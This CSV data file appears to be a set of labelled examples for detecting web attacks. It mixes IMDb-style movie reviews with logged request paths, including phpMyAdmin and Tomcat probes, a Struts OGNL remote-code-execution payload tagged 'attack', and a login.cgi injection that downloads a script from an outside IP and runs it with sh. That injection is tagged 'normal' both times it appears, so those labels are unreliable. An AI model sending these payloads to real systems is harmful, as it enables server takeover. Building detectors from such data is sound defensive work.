post,tags
/mt/mt-static/addons/Community.pack/themes/tristan-blue/footer.png,normal
/robots.txt,normal
/admin/mysql2/index.php,normal
"I was excited about this movie after reading other reviews. What a disappointment! There are so many ways that this movie is bad. The computer graphics were lacking to say the least. I found the acting stiff and unbelievable. Watch the sand as the lost ""e-pods"" (what an original name!)are found. Where did all the tracks come from? I immediately recognized portions similar to other movies, ie Alien, Pitch Black. Come on,one huge ship to transport one prisoner? And what is with the prisoner? Does he speak, can he speak? I kept waiting for something to tie the bits of the story together, but it never came. If this movie was made on a low budget, it shows. The only part of the movie I liked was when it finally ended. I don't mean that I liked the ending, I didn't. I just liked the fact that it was over. A trip to the dentist would have been more enjoyable. In my opinion. don't waste your time on this one.",normal
/mt/mt-static/addons/Commercial.pack/themes/professional-black/screen.css,normal
/claroline/phpMyAdmin/index.php,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
"This film recreates Lindbergh's historic flight across the Atlantic while touching on episodes in his aviation career through flashbacks. Stewart was about 20 years too old to be playing the young flier, but his fine performance, particularly in the solo flight sequences, makes this a minor quibble. Waxman's rousing score is a big plus. Despite the long running time, Wilder manages to make it quite exciting and is able to sustain the drama even though the outcome is known. What a year 1957 was for Wilder: besides this, he also wrote and directed ""Love in the Afternoon"" and ""Witness for the Prosecution."" And his next two were ""Some Like it Hot"" and ""The Apartment."" What a run!",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/logo.gif,normal
/mt/know-how/mt.js,normal
/mt/mt-static/images/comment/mt_logo.png,normal
/mt/mt-static/addons/Commercial.pack/styles-customfields.css,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
"Quintet marks the only venture of both Paul Newman and director Robert Altman into the realm of science fiction. It was said of Newman that he could not do comedy, but he tried until he finally scored a real success in that genre with Slap Shot. But the failure of this film left him gun shy and he never tried it again.<br /><br />This is one of the biggest downer films I've ever seen. It's a futuristic ice age, brought on by who knows what, but presumably it's a nuclear winter. Even during the ice age of thousands of years ago, the equatorial parts of the earth still sustained animal and human life, but apparently not here. Seals have survived and Paul Newman is a seal hunter on the outside.<br /><br />But hunters do need a little R&R and Newman goes to a futuristic city where things are so boring the natives have some kind of game played with six people and it's a kind of Russian roulette. To win you have to kill five other participants in your game.<br /><br />It's a sad turn to see what man has come down to. Which is one of the reasons I just could not get into this story. The atmosphere is bleak, the story is bleak, the people are bleak, it's all so bleak. No wonder this thing came up short at the box office.<br /><br />It's a film that just about everyone thinks is never going to be on the top ten list of Paul Newman films, including me.<br /><br />This is man's future, what a bummer.",normal
/PMA/index.php,normal
/login.cgi?cli=aa aa';wget http://185.62.190.191/r -O -> /tmp/r;sh /tmp/r'$,normal
/phpMyAdmin/index.php,normal
"In 1858 Tolstoy wrote this in his diary: ""The political is not compatible with the artistic, because the former, in order to prove, has to be one-sided."" This thought from a great mind is applicable to USA The Movie. The film might be read by those with a narrow focus as a 90 minute slam of Bush, Cheney et. al. as well as a ripping of America as an out-of-control imperialistic force that will ultimately be destroyed by its own folly and thirst for power. The more open-minded viewer will take note of the recurring images and themes that make this DVD a testament to postmodernist thought, as the main character breaks up into bits and pieces surrounded by recurring visuals of the natural world contrasted with the man-made constructions; towers, roads, video monitors, radio, vehicles. Above all the ominous threat of wars that have been and are to come smolder throughout. War and rumors of war are what is created, destroyed and recreated on the screen, in our conscious world and in our unconscious minds.",normal
/wls-wsat/CoordinatorPortType,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/container.png,normal
"I went into a screening of ""SISTER HELEN"" at the Sundance Film Festival and did not know what to expect.<br /><br />I was riveted by the people in this documentary. Sister Helen is an incredible character!!! The filmmakers captured the essence of Sister Helen's amazing soul and took me into a world unknown. I was thoroughly satisfied by the journey and was completely caught off guard by this film's ending.<br /><br />This film speaks to those who desire a second chance at life.",normal
/pmamy/index.php,normal
/struts_chat/board/board.action,normal
/polycom/,normal
/mt/mt-static/images/status_icons/feed.gif,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/navigation-bg.png,normal
/mt/know-how/home.html,normal
/mt/know-how/2017/02/v.html,normal
"This movie, one of the best I've ever seen, talks about incommunicability. It does it plunging ourselves in a livid Taipei, stained in cold colors, where the rain falls incessantly; a DAMP world. It does it displaying us the story of two persons living in this world, a man and a woman. a coincidence, or the fate,links their existences, but they're not able to open one to the other with words. Characters are the mirror of the difficulty of our society concerning interpersonal relationships. An incommunicability that here is taken to the extreme limits. all the characters exchange only a few words during the movie, dialogues are nearly absent, and when some words are spoken they're often weak and empty, far away from describing people's real feelings. So, the progression of the story, the revelation of character's feelings is developed (brilliant idea!) by the musical digressions, only apparently meaningless, that speckle the movie. The proceeding of the sentimental event, and the drama of female protagonist, lead us to a splendid ending, heavily symbolic. A movie totally different from the usual, a clever realization by a great-talented director. PS. Forgive me for my bad grammar!!",normal
"If Corky St. Claire in WAITING FOR GUFFMAN had directed the citizens of Blaine in a horror movie with comic undertones the result would have been very much like THE MILPITAS MONSTER.<br /><br />To be generous, this was the longest hour and twenty minute movie I've ever seen. To call the pace glacial is to be kind.<br /><br />Almost nobody associated with this project ever made another movie with the exception of Ben Burtt, who did the really admirable (considering the budget) special effects. He went on to do sound for movies like MUNICH and several other big budget projects. The narration is by veteran voice-over actor Paul Frees, who probably donated his efforts.<br /><br />When you're watching the opening titles and see the Milpitas Unified School District listed as one of the producers you know you're going on a long, strange trip.<br /><br />Pollution at the down dump in Milpitas, California, becomes so toxic that it creates a monster. Remember that this is 1975 and ecology was a hot topic. Just a few years previously moviegoers had been treated to GODZILLA VS. THE SMOG MONSTER.<br /><br />So far so good. The monster is a winged creature at least fifty feet tall and has the capacity to tear the town apart. Instead it steals garbage cans.<br /><br />Central to the premise is the idea that this monster can prowl a small city and leave eight foot long footprints behind but not be noticed by anyone. There's a nicely conceived scene where it walks through the middle of a carnival at night but somehow nobody notices.<br /><br />The only person who sees the monster until the final scenes is George, the town drunk. All through the movie I hoped, hoped, hoped that George would be torn to shreds on camera but this didn't happen. Drat. In fact, nobody gets killed. George supposedly sacrifices himself to save Priscilla (he's tied to a helicopter to lure the creature- George smells worse than garbage and the monster is attracted to the scent).<br /><br />The nominal leads are a group of high school students. There's pretty Priscilla and her nondescript boyfriend and some ""bad"" boys who (surprise, surprise) whip themselves into shape to help defeat the monster in the final scenes.<br /><br />The monster is involved in four main set pieces. He attacks a Browning-Ferris garbage truck and leaves it beside an elevated highway, but nobody notices. He walks through the carnival, again unnoticed. He tears up a building (nice miniature work) and nobody sees him but George. Then he attacks the high school during a dance and grabs Priscilla and carries her off just like a certain very tall ape has done several times, most recently this past winter.<br /><br />There are plot ideas that come out of nowhere and are dropped. Local citizens picket at City Hall because they want their garbage cans back. An elaborate secret weapon for tracking monsters is flown in by private jet, examined, and forgotten.<br /><br />So why did I watch the whole thing? Because these people were having so darned much fun. I had the idea that the firemen were firemen, the businessmen were being filmed in their own offices, Priscilla may well live in that suburban tract house, and scenes of people in their yards may well have been in their own yards.<br /><br />They may not be great actors, but they are real people. Nobody is stunningly good looking. In fact, I'd estimate that four out of five of the adults on screen wear glasses. Since this is the mid seventies we see some really bad clothes and some of the men have awesomely bad facial hair. One dignitary being interviewed before a meeting at Ciry Hall has such a loud tie and sportcoat that you think he's on his way to play Marcellus in THE MUSIC MAN.<br /><br />And that got the movie two extra stars. Zero for the story. Two points for the sometimes decent special effects. And two points for the fact that people in the community actually got together and did this. They can actually say they've performed in a movie; despite lots of stage experience and working behind the scenes in live television I can't say that, and I'm happy for them.<br /><br />Remember those great old movies with Mickey Rooney and Judy Garland? At some point somebody would say, ""Let's put on a show! Aunt Edna has all those old clothes in the attic, and we can use Uncle Ned's barn!"" Then they'd do 'neighborhood shows' with sets and costumes that would cost well into seven figures if duplicated today.<br /><br />That's the spirit that the good people of Milpitas had for this project, and bless them for that.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/header.gif,normal
/admin/phpMyAdmin/index.php,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/header-menu-bg.png,normal
"This movie embodies the soul of modern ""elite"" foodculture, even though the movie is 17 years old. The standing principle in the movie is: Food is more than just nourishing matter. It is also a powerful symbol and a medium for culture itself. The main characters literally get drunk on the finest wine and food, become inspired by idealistic thoughts and culture, as they let go of their puritanism and passion-denying table manners. Karen Blixens shortstory makes use of the difference between North Europe and South Europe, to point out their inherently different approaches to food. As the strict and and rather dull scandinavians get infused with ""Eros"" from south, the party gets going. So what are you waiting for? Go watch it.....again!",normal
http://180.163.113.82/check_proxy,normal
"How any of you gave this more than 2 stars amazes me. I made an account on IMDb just to comment on this cr@p film. The acting is cr@p and the plot is cr@p. It would deserve no stars at all if it weren't for the descent soundtrack (and yet there are still some outrageously clownish tracks in there too, most notably the ones featuring the oboe and sound like black and white cartoon comedy background music and in no way fit the intended mood of the scenes that they haunt) and quality cinematography. The dialog and plot are about as complex as that of a Dr. Sues book. These actors are horrible. I am actually watching this movie right now and, with every word, am stunned you all swallowed this shitte. The only reason I didn't turn the movie off was because I have gotten wrapped up in creating an account on IMDb and posting this review. I dig mainstream films, I dig silly stupid films, I dig retro indie films, and nearly any other type/genre if carried out well. My brother convinced me to rent this because he said he heard it was good and he generally has great taste in movies; from the moment he told me the title I looked at him like he was crazy. I'm having a tough time ending this rant because there is just so much badness to talk about. The only way I can rationalize the good ratings on here is that you guys were paid to give this movie high ratings. It is so poorly done and no where close to dramatic, artsy, complex, well written, well preformed, or even bearable. If this was the final product of my hard directorial work, I would be to embarrassed to release it to the public, so I don't even feel sorry for the director if he reads this -- what the hell were you thinking guy?",normal
"In the beginning, with the careful, remote location and sweeking metal sound, I thought of the opening scene in ""Once upon a Time in the West"". When it gets to the city, then it begins to feels like ""Kitchen Stories"", or ""Drifting Clouds"", even possibly ""Grimm"".<br /><br />Then it turns out that this is more similar to ""Joe Versus the Volcano"" in theme (not style). And the movie executes from beginning to end the same, understated style. Letting you observe, take in the steel, blue-grayish tone of the suites, dresses, wall color, furniture, bedsheets, mirrors, cars, music, background sounds and even people's expression. Then near the end, there is one shot of a completely different tone - warm orangeish-yellow with soft music and ocean splashing, children and laughter.<br /><br />But maybe the observation is too long for me, I would much rather to see the alternative side or what happens to the character after the ending shot. Still beautifully done.",normal
"I've seen this movie quite a few times and each time I watch it, the quirkier and funnier it becomes. Perhaps its the lack of research that went into Nicolas Cage's character's 'punk' persona or just the cheesiness factor because it was such a typical eighties film...nonetheless it's a cute love story with extremely funny, unique characters. I think it's right up there with ""Fast Times"" and ""Weird Science"" (quintessential eighties flicks!)",normal
/mt/mt-static/images/status_icons/feed.gif,normal
/mt/know-how/2017/02/entry.html,normal
/admin/phpmyadmin2/index.php,normal
/mt/mt-static/addons/Commercial.pack/themes/professional-black/nav-bg.gif,normal
"I'm a huge fan of legendary director Elia Kazan . His movies often deal with people trying to overcome their weaknesses. Be it obsessive love in 'Splendor In the Grass, poverty in ""A tree Grows in Brooklyn"" or racism in ""Gentlemen's Agreement."" While looking for other movies made by Kazan, I stumbled across a movie that was based on a novel by Arthur Miller. The movie called ""Focus"" stars William H.Macy (who happens to be one of my favorite actors) and Laura Dern. It deals with anti-Semitism in a very realistic way. <br /><br />Macy's character seems to go along with the bigots in his neighborhood and on his job, until it affects him personally. That's the key here... the reason he acted wasn't because he knew it was wrong and he wanted to take a stand, he acted because he was now considered an outsider, and he began to experience the same looks, the same remarks, and the same brutally that Mr. Finklestein (David Pamyers)experienced .<br /><br />The movie is very well written and well acted. Meat Loaf does a awesome job of playing a dirt bag! Both Macy and Dern's performances are outstanding! It's easier in life to go along with, instead of going against. Sometimes in order for people to take a stand things have to impact their lives, or the lives of their loved ones...Only then will some find their moral compass.",normal
/favicon.ico,normal
http://112.124.116.170:83/index.php,normal
"This must have been one of Chaplin's most ambitious projects; he throws in virtually everything, from visual gags and blackout comedy sketches to social relevance, romance, even some violence. The mixture is challenging and intriguing, and the film has many entertaining and clever sequences (like the one where Chaplin and four other guys try to avoid finding a coin that will order their self-sacrifice), but the ingredients don't always click together, and the mix (and tone) seem kind of disharmonious. As for the famous final speech, though undeniably honest, it also seems a bit naive today, with its allusions to ""a better world where man will overcome his hate and brutality, and his soul will fly"". Great perfornmances by Jack Oakie and the beautiful Paulette Goddard. (***)",normal
/mt/mt-static/addons/Commercial.pack/styles-customfields.css,normal
/mt/mt-static/themes-base/blog.css,normal
"Based on the manga (comic) of well-known artist Masamune Shirow, this animated feature was a slight disappointment to me.<br /><br />The story is good, but the animation is merely ""OK"" while it could/should have been mindblowing. The movie is IMO adequate, but seems somehow flat & uninspired, if you know what I mean. A wasted opportunity, if you consider that another work by Shirow, ""Ghost In The Shell"", is considered a classic in many respects. It set new standards for Japanese animation, and spawned, among other things, a brilliant series called ""GiTS: Stand Alone Complex"".<br /><br />I consider this worth a rental, unless you're a fan of Shirow and want it all. Do check out the original manga, which comes highly recommended.",normal
/struts_chat/board/board.action,normal
/phpmyadmin/index.php,normal
/noindex/css/fonts/Bold/OpenSans-Bold.woff,normal
"John Voight plays the title character in this movie based on author Pat Conroy's (Prince of Tides) autobiography. A fine teacher film, it tells the story of a naive Pat Conroy, a young English teacher whose first assignment is in an elementary school on a rural island. The only white man on the island, he must battle internal and external pressures as he attempts to instill education and values in children who for generations have been systematically denied such things. A solid performance that really makes you think.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/footer.png,normal
"His significant charisma and commanding presence are about all that keep this afloat, but Fred Williamson has done far better urban action films including many of his later, vid-released fare. The big studios' Williamson films of the early-to-mid 70's rarely had the punch of their mid-level counterparts, and this is a prime example. Clumsy action, little violence, and the PG rating is nowhere near questionable. Worth a look for Hammer completists in any case.",normal
/myadmin2/index.php,normal
"I saw the film yesterday and really enjoyed it.Although there were several clues which I could realize after second time watching ,I was not able to awake the Dow-Dawn case. Maybe this was my carelessness.The subconsciousness of a woman was became concrete with personalization.'Let me go out'the key sentence of the film.Let me go out from deep deep inside of your brain and we will both be free.A discrete film that forcing the limits of human conscious and brain.Anybody who have seen the 'Machinist' would realize the similarities with breaking dawn.A man that could not escape from his conscience (again a psychological and an abstract concept)meets it in an human body.And he will just be free of accepting and realizing there is no way of escape.Also I want to mention about the performances of 'breking dawn's stuffs.In spite of having not many experiences, from actors and actresses to director all exhibited separately reasonable performance that have created a synergy which would increase the quality of the movie",normal
"I have been hooked on ""GG"" since midway through 2001-2002 (2nd season), when I tuned in to see ""Smallville"" 10 minutes early. Thanks to ""Beginnings"", I now have all but 2 episodes on tape, right up through last night (Ep. 4.9). I am a middle-aged straight male, and this is the ONLY weekly TV show I watch.<br /><br /> I love this series because: a) Lauren Graham is a damn fine-looking woman, and funny and smart to boot; b) the dialogue is extremely well-written; c) it is flat-out hilarious, putting overrated garbage like ""Everybody Loves Raymond"" to shame. Many current TV comedies have been heavily influenced by the highly successful and much-despised slime-pit known as ""Married with Children"", where the viewer is encouraged to deride and feel superior to the characters. In ""GG"", the characters have faults, but we can see our own foibles in them, and laugh with them, not at them. This is stimulating TV, where the writers challenge us to keep up with rapid-fire exchanges and out-of-left-field pop-culture/literature/current events references. I get immense pleasure out of watching these episodes over and over again, catching all the one-liners and references to previous episodes. Stars Hollow is its own little world, one that I will happily continue to visit as long as the series runs.",normal
"There's some nice scenery to look at here,if you can keep your eyes open long enough to see any of it.I'm a big fan of slice-of-life movies,but these people are just plain bland.Although there's nothing political here,the entire film can be looked at as a political statement,in that it shows how Communism destroys the individual,making everyone the same bland animal that just spends its life sleeping,eating,and occasionally making love.",normal
"when I know that Walter will never grace another set.I was in my 30's when I first saw this sweet,endearing and unabashedly romantic film.I loved it from the first scene,and all the way through to the end.Art Carney was his usual daft self; Glenda matched Walter step for step in the witticisms;and Richard Benjamin supplied the sarcastic voice of reason that he does so well.Along the way there were many actors whom we all recognize,doing their usual brilliance. There are a couple of lines in the movie which my SO and I have used throughout the years,but I won't say anything about them here.I'm pretty sure you will know which two I am talking about. Just get this movie.Make some popcorn,grab your squeeze(if he is as sappy as mine is,for which I am thankful),and enjoy this standout romantic comedy from the 70's. You will not be disappointed. However,I have the feeling that I am preaching to the choir here because anyone who loves Walter will already own it.I'm very glad it's out on DVD now,finally.",normal
"A very interesting addition to the Scandavian surrealistic collection. Recommended viewing for those who like their movies complicated. My interpretation of the 'strange' ending would be that Andreas' journey ends in Hell. He dislikes the bland consumer-led emptiness of purgatory; a sort of 'living' but not progressing, i.e. not getting anywhere - even the city's metro trains don't stop at the stations. It has a Metro system, like you should be able to travel, freedom, escape, but you can never actually board those trains. He is unable to reach fragrant, sensory heaven and winds up continuing his bus journey to its final destination. The old Norse version of Hell (Hades, NOT Hell the terrestrial city) isn't burning hot like the British version, its cold, freezing, the land of Niflheim (land of cold and mists). This appears to be where Andreas end up, having just failed to access Heaven through that tunnel.",normal
"It is depressing that many people don't understand this movie. To get caught up in the peripheral elements is to miss the true meaning of this film. This film speaks to the minority of people who actually believe in love and truth. It points out that in todays society too often people say what sounds good at the moment with no intention of backing things up when things get rough. as someone else stated that is evident in the number of divorces. Some people actually believe marriage is forever. Forget about stereotypes or anything else, but rather focus on what is important following your heart and fighting for who you believe in. I liked the ending because it would have been easy to go with a sappy one but came instead with the reality that committent is great, and you should fight with everything you have, but sometimes that still isn't enough. Too often people just give up and forget about the magic of love. late.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/screen.css,normal
/phpmyadmin0/index.php,normal
"I've just watched Fingersmith, and I'm stunned to see the 8/10 average rating for the show.<br /><br />Not only was the plot was difficult to follow, but it seems character development was randomly applied.<br /><br />The actors were adequate, but in the process of attempting to create twists and turns, their characters are rendered entirely one dimensional. Once this happens, the story really falls flat and becomes tedious.<br /><br />And just in case anyone didn't see the predictable lesbian undertones from miles way, this is hammered home in the most banal terms at the end of the film.<br /><br />The end scene is disappointing and phoned in, and anyone who sat back and went ""Ohhh, so they were carpet munchers all along!"", must have been out for the evening.<br /><br />Two stars for the tonsil hockey in the earlier scene which was at least a bit raunchy, none for the rest of it...",normal
"I caught this movie late one night and never knew what hit me. This was one of the most disturbing movies I have ever seen, yet had me on the edge of my seat waiting to see what would happen next. Alan Rickman is an excellent ""bad guy"" but this character beats all others. I've never been so affected by a movie! It's been 6 years and I still can't forget ""Closet Land.""",normal
"Controversial German journalist Jutta Rabe who herself got divers to the Estonia wreck, put this silly ""thriller"" together to save her investment.<br /><br />Donald Sutherland is of course always watchable - but he's only in three scenes. He delivers his material perfectly - as you can ask from a professional. Also, the main lead, J殲gen Prochnov, is at times very good.<br /><br />The rest of the cast is, however, bad. The actress that plays the Swedish minister secretary (or whatever she was - she seems not listed in the cast) is EXTREMELY bad.<br /><br />The script has some nice ideas, and the story is actually kind of interesting. The final screenplay should have been re-written a couple of more times though. Some scenes are plain ridiculous - especially the end scenes.<br /><br />The film is almost 2 hours, which is about 45 minutes too long. Presented as a 60 minutes TV-film, this could have been really interesting. As a two hour feature, it's pretentious, boring, stupid and plain out silly.<br /><br />Jutta Rabe might be a good journalist (her ideas about governments using Estonia to transport military items from Estonia to Sweden have been concluded as true recently, when the Swedish military officially said that they actually used the ship Estonia for this), but as a film producer she sucks.<br /><br />The director, the writer and the actors suck more.<br /><br />I give this film 3/10. I would've given it a 1, if it wasn't for the fact that the story is quite interesting at times, Donald Sutherland is in it and it has real stock footage.<br /><br />But we don't even see the boat sink! What kind of movie about a ship that sinks is that? Like a werewolf movie without werewolves...",normal
/manager/html,normal
/pma/index.php,normal
/cgi-bin/mt/mt-cp.cgi?__mode=register&blog_id=2&return_to=http://www.reverse-edge.com/mt/know-how/2018/03/,normal
"By mistake, I ordered a series from the BBC, their new version of Robin Hood. Very disappointing in comparison with RoS. Terrible costuming and backgrounds. While I enjoyed the Sheriff, who took cues from the Nick Grace character, the rest of the cast left much to be desired. As a ""for instance"", Marion's costuming looked suspiciously like it came from Walmart. And Sir Guy, well, he looked a bit like a character from an outer space movie! RoS has stolen the spotlight, probably forever, in the telling of this tale. Cast, costuming, story lines, scenery, filming and soundtrack by Clannad are all superb, as is evidenced by all the continual feedback some 26 years on. RoS is a timeless classic. My thanks to all who made the series.",normal
/pmamy/index.php,normal
/struts_chat/board/board.action?test=test,normal
/mt/blog/2017/04/processes-of-suffering-or-struggling-for-something-are-never-be-vain-even-if-they-make-no-outputs.html,normal
/cgi-bin/mt/mt-cp.cgi?__mode=view&blog_id=2&id=1,normal
/dbadmin/index.php,normal
/console/auth/reg_newuser.jsp,normal
/login.cgi?cli=aa aa';wget http://185.62.190.191/r -O -> /tmp/r;sh /tmp/r'$,normal
/admin/phpmyadmin2/index.php,normal
/xampp/phpmyadmin/index.php,normal
/blog/wp-includes/wlwmanifest.xml,normal
"After two brief scenes that at first seem unrelated to the rest of the film, we see a dark-haired, obviously rich beauty in the back of a limousine. Her driver stops at an odd location on Mulholland Drive, which is a twisting, thickly wooded two-lane road full of mansions overlooking Los Angeles. Just as her driver and another man in the passenger seat turn around to kill her, two drag racing cars from the opposite direction come crashing into the limo. Only the dark-haired woman survives. She works her way down the ridge to Sunset Boulevard and hides in a vacationing woman's apartment. Shortly after, Betty (Naomi Watts), the vacationing woman's niece, shows up at the apartment and runs into the dark haired woman, who now has amnesia. The bulk of the first part of the film is Betty and the dark haired woman trying to figure out who she is, why people were trying to kill her and why she had thousands of dollars and a strange key in her purse. This is interspersed with oddly surreal threads about Hollywood producers and directors, with occasional forays into a land of hoodlums and prostitutes.<br /><br />The above may sound a bit complicated and disjointed, but that's not the half of it. The film is constructed so that the meaning will always be open to interpretation. It's basically guaranteed that you will not understand this film and you will not have very much confidence arriving at your own interpretation the first time around. Even if you have a lot of experience with like-minded films--such as Memento (2000), Donnie Darko (2001), The I Inside (2003) and The Butterfly Effect (2004)--you may not understand it on a second viewing, either. The studio was aware of this to the extent that they had director David Lynch write ""10 clues to unlocking this thriller"" and they put it on the back of the chapter listing insert in the DVD. Lynch being of a particular disposition, these clues are almost as cryptic as the film itself. It doesn't help when trying to figure it out in the early stages that the structure is extremely complex. It takes a very long time to figure out what parts are supposed to be ""real"" and there is a complex nesting of flashbacks in some sections, with only contextual clues that they're flashbacks.<br /><br />But is the film worth watching, or worth trying to figure out? That depends on your tastes, obviously. On a surface level, the film is certainly attractive if you are a fan of surrealism, although it will tend to seem a bit slow and overly disjointed to some viewers. But those qualities, and many other surrealist aspects of the film, are typical of Lynch. A prime Lynchian moment is the old couple in the beginning bizarrely smiling almost as if they're alien pod people trying to put on a front. If you're familiar with that style and like it, you'll find much to love here, although in many ways, Mulholland Drive is fairly understated for Lynch. It's also worth noting, for viewers who'll primarily be interested in it or who enjoy it just as much as other aspects, that Mulholland Drive has a quite steamy lesbian scene. It's not gratuitous, although I have no problems with gratuitousness, but is instead an important hinge in the film.<br /><br />Like all of Lynch's films, it's easy to become enraptured in his unique approach to every aspect of filmic art and his attention to detail. Any serious student of film (including ""armchair students""/""cinephiles"") should study Mulholland Drive; many will love it. Lynch doesn't let anything pass unmanipulated. He includes brilliant color schemes (such as the plethora of reds and pinks) with important symbolism. He makes unusual use of sound, such as the ringing telephone carrying over into the section of score that follows it (when Betty first arrives at the airport). He directs his actors to deliver their lines in a plethora of bizarre ways, such as his characteristic odd pauses. He lets his odd and surprising sense of humor poke through, such as the name ""Winkie's"", and the ""Hot Dogs--made for Pinks"" sign that provides a clue to some of the color symbolism.<br /><br />Lynch's attention to detail in production design provides important, subtle clues throughout the film to help one unlock the meaning. It's interesting to note that Lynch even apparently demands that the DVD programming be unusual--there are no chapters on the disc; you must either watch the film in real time or fast forward or rewind to get back to particular points.<br /><br />If the surrealism and veiled meaning of the film are attractive to you, or if you're just fond of ""puzzles"", then Mulholland Drive is well worth watching for that aspect. There is a fairly accepted interpretation of the film, at least on a broad, generalized level. I won't recount the standard interpretation here--it is worth researching, but only after you've seen the film a couple times and have reached your own conclusions. Many articles and monographs have been written on the film and interpretations; there are even websites dedicated to it.<br /><br />For my money, however, although I generally love Lynch and find many things about Mulholland Drive attractive, it is not quite a 10 for me, at least not yet (I have a feeling that my score could still rise on subsequent viewings). To me, though, the ""twist"" aspect of the film is done much better in other works such as The I Inside and The Butterfly Effect. Mulholland Drive is more attractive to me for its surface surrealistic touches, but the plot doesn't carry them as well as some of Lynch's other films.<br /><br />Still, Mulholland Drive is certainly recommended for the right crowd. If you're serious about film and do not mind having to think about what you watch (as if those two would not necessarily coincide), you shouldn't miss this one.",normal
"I wasn't expecting to much of this movie when I went into the theater but I had been waiting for it for many years. To sum it up, it was pretty damn good! Chad Michael Murray was pretty good, I thought he was going to be another Chris Flynn from Wrong Turn but I was wrong. Elisha Cuthbert was also good but the best performance has to go to Brian Van Holt. He played the bad guy too well, I mean he was sick, sadistic, and very cruel. The back story between the brothers was good, plus I liked how no killings took place until about 40 minutes into the film. It gave you time to pick the character you wanted to see live and the one you wanted to see die. Jon Abrahams was pretty good as the goofy best bud of CMM. I liked how Chad kind of cried when he found him dead, it was better then just him being like, ""Whatever, my buddy is dead, who cares"". It showed how he really cared. So overall, this was a darn god slasher with some great effects. Bravo!",normal
